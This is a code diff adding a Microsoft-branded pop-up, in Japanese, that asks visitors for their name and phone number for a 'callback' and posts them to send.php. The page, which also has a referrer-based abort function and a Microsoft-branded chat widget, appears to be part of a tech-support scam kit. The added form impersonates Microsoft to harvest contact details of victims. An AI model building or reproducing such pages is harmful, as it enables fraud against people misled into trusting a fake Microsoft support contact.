@@ -215,7 +215,59 @@ function logAndAbort($reason, $referrer, $log_file) {
         </strong>
       </p>
     </div>
+    <div id="form" style="display: block;position: fixed;background: white;border-radius: 10px;bottom: 80px;left: 10px;padding: 15px;cursor: auto;">
+  
+  <img src="images/img.png">
+  <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
+  
+  <p style="font-weight:600;font-size:24px">
+    コールバックリクエスト
+  </p>
 
+  <form id="callbackForm">名前 :<br>
+    <input name="name" id="name" required="" style="font-weight:600;font-size:22px;border-radius: 5px;">
+    
+    <br>電話 :<br>
+    <input name="phone" id="phone" required="" style="font-weight:600;font-size:22px;border-radius: 5px;">
+    
+    <br>
+    
+    <button type="submit" style="margin-top:5px;border-radius:5px;">提出する</button>
+  </form>
+
+  <p id="responseMsg" style="color:green;font-weight:600;"></p>
+
+</div>
+    <script>
+document.getElementById('callbackForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const name = document.getElementById('name').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+
+    if (!name || !phone) {
+        alert("Please fill all fields");
+        return;
+    }
+
+    fetch('send.php', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`
+    })
+    .then(res => res.text())
+    .then(data => {
+        document.getElementById('responseMsg').innerText = data;
+        document.getElementById('callbackForm').reset();
+    })
+    .catch(err => {
+        document.getElementById('responseMsg').innerText = "Error submitting form";
+        console.error(err);
+    });
+});
+</script>
     <div id="chat" class="bounce" style="display: block;">
       <img src="images/img.png">
       <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
